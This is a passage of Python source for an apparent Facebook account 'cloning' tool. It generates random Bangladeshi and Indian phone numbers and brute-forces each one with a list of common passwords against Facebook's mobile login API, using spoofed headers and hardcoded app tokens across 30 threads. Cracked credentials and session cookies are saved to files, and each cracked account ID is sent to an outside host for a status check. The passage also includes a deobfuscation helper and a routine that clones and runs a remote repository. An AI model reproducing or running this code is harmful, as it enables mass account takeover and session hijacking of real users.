            head = {"User-Agent": f3(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://b-api.facebook.com/method/auth.login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r{white}[{green}RxA~OK{white}] '+ids+' | '+pas)
                linex()
                print(f'\r\r{B}[{white}COOKIES{B}]{cookie}\n')
                open('/sdcard/Prínce Lücky-F3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{B}[{R}Prínce Lücky-CP{B}] '+ids+f' | '+pas)
                open('/sdcard/Prínce Lücky-F3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ RANDOM }──────────────#
def __Randmx__():
	clear()
	print(f"{G1}(1) BANGLADESH CLONING");print(f"{G2}(2) INDIA CLONING");linex();option = input(f'{rad}[?] {G16} CHOICE {white}▶ ')
	if option in ['A','1']:__bdx__()
	elif option in ['B','2']:__india__()
	elif option in ['C','3']:__pakistan__()
	else:
		print(f'\n{A}|=| OPTION FOUND');menu()
#──────────────{ RANDOM-BD }──────────────#
def __bdx__():
    user=[]
    clear()
    print(f'{S}[≈{S}] {G16}SIM CODE : {green} 017 / 019 / 016 / 018');linex();code=input(f'{rad}[?] {G16} CHOICE {white}▶ ')
    clear()
    print(f'{S}[≈{S}] {G16}LIMIT EXA :{green} 5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{rad}[?{rad}] {G16}CHOICE  : {green} '))
    except ValueError:
        limit=50000
    clear()
    print(f"{G}(1) METHOD M1 {S} [{A} WIFI & BL SIM ]{white}[{green}LOCK RM{white}]");print(f"{U}(2) METHOD M2 {S} [{A}ALL SIM & WIFI ]");linex();methodx = input(f'{G17}[?{G17}] CHOICE : ')
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as RAKIBx:
        clear()
        tl=str(len(user))
        print(f"{rad}〘{yelloww}◆{rad}〙{yelloww}TOTAL IDS  ➺ {white} {tl} {rad}|{yelloww} CODE : {white}{code} ")
        print(f"{rad}〘{yelloww}◆{rad}〙{yelloww}SIM NAME   ➺ {white} {sim}")
        linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,ids[:7],ids[:6],ids[8:],ids[4:],'sadiya','jannat','bangla','bangladesh','i love you','free fire','@@@###','@@@@####','@@##@@##','mim@@@@']
            if methodx in ['1']:RAKIBx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:RAKIBx.submit(__Randm_M2__,ids,passlist)
            if methodx in ['3']:RAKIBx.submit(__Randm_M3__,ids,passlist)
            if methodx in ['4']:RAKIBx.submit(__Randm_M4__,ids,passlist)
            if methodx in ['5']:RAKIBx.submit(__Randm_M5__,ids,passlist)
    print('');linex();print(f"{A}[=] CLONING COMPLETE ");print(f"{A}[=] {M}TOTAL OK ID :{G} {len(oks)}");print(f"{A}[=] {green}TOTAL CP ID :{R} {len(cps)}");linex();exit()
#──────────────{ RANDOM-INDIA }──────────────#
def __india__():
    user=[]
    clear()
    print(f'{S}[≈{S}] {G16} SIM CODE : {green}+91639 / +98282 / +92627 ');linex();code=input(f'{rad}[?] {G16} CHOICE {white}▶ ')
    clear()
    print(f'{S}[≈{S}] {G16} LIMIT EXA : {green}5000 / 10000 / 9999 / 99999');linex()
    try:
        limit=int(input(f'{rad}[?{rad}] {G16} CHOICE  : '))
    except ValueError:
        limit=50000
    clear()
    print(f"{G}(1) METHOD M1 {S} [{A} WIFI & BL SIM ]{white}[{green}LOCK RM{white}]");print(f"{U}(2) METHOD M2 {S} [{A}ALL SIM & WIFI ]");linex();methodx = input(f'{G17}[?{G17}] CHOICE : ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as RAKIBx:
        clear()
        tl=str(len(user))
        print(f"{rad}〘{yelloww}◆{rad}〙{yelloww}TOTAL IDS  ➺ {white} {tl} {rad}|{yelloww} CODE : {white}{code} ")
        print(f"{rad}〘{yelloww}◆{rad}〙{yelloww}SIM NAME   ➺ {white} {sim}")
        linex()
        for love in user:
            ids=code+love
            passlist=[love,ids,ids[:7],ids[:6],love[1:],"57273200","5757575","57575751","57575752","59039200","07860786"]
            if methodx in ['1']:RAKIBx.submit(__Randm_M1__,ids,passlist)
            if methodx in ['2']:RAKIBx.submit(__Randm_M2__,ids,passlist)
    print('');linex();print(f"{A}{G18}[={G18}] {green} CLONING COMPLETE ");print(f"{G17}[={G17}]TOTAL OK ID :{G} {len(oks)}");print(f"{G17}[={G17}]{M} TOTAL CP ID :{R} {len(cps)}");linex();exit()
#──────────────{ RANDOM-METHOD-M1 }──────────────#
def __Randm_M1__(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r{white}={U}[Prínce Lücky~{yellow}R1]{white}={M}[{M}{loop}]{white}={green}[{green}{len(oks)}]{white}={white} <\> {white}={rad}[{len(cps)}]{white}= ');sys.stdout.flush()
    try:
        for pas in passlist:
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': r(),
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'Banglalink',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
                if res == 'LIVE':
                	print(f'\r\r\33[0;41m[{G1}Prínce Lücky-OK{A}]{green} {uid} {A}|{green} {pas}\33[0;92m');open('/sdcard/Prínce Lücky-RNDM-R1-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{A}[{S}Prínce Lücky-LK{A}]{rad} {uid} {A}|{rad} {pas}');open('/sdcard/Prínce Lücky-RNDM-LOCK.txt','a').writer(uid+'|'+pas+'\n');lock.append(uid);break
            else:continue
        loop+=1
    except Exception as e:
        pass
#──────────────{ RANDOM-METHOD-M2 }──────────────#
def __Randm_M2__(ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r{white}={G2}[Prínce~{yellow}R2]{white}={M}[{M}{loop}]{white}={green}[{green}{len(oks)}]{white}={white} <\> {white}={rad}[{len(cps)}]{white}= ');sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': f1(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                print(f'\r\r\33[0;41m=[Prínce Lücky-OK]= {str(uid)} | {pas}\33[0;92m')
                                print(f'\r\r{warna} [ COOKIE ] {xx}{coki} ');linex()
                                open('/sdcard/Prínce Lücky-RNDM-R2-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r\r{R}=[Prínce Lücky-CP]= {str(uid)} | {pas} ')
                                open('/sdcard/Prínce Lücky-RNDM-R2-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass
#--dec--#
def rakib():
    os.system("clear")
    print(logo)
    print(f"{green}[A] {white}Decode Zlib \n{green}[B] {white}Decode Base64")
    linex()
    choice=input("[+] input:")
    dec()

def dec():
    os.system("clear")
    print(logo)
    print(" Example file_enc.py")
    file=input(" input file: ")
    ogge=str(open(file,"r").read())
    data=ogge.replace("exec","MrSava=")
    data2=f"""{data}\nopen(\"dec_done.py\",\"w").write(MrSava.decode(\'utf-8\')) """
    open(".dara.py","w").write(data2)
    os.system("python .dara.py")
    print(" file saved with dec_done.py")
    print(" Dec done [✓] ")
    
#####_____Create-File_____#####
def file():
	os.system("cd && git clone --depth=1 https://github.com/Hannan-404/FILE")
	os.system('cd && cd FILE ;python FILE.py')
#──────────────{ END }──────────────#
#menu()
apv()
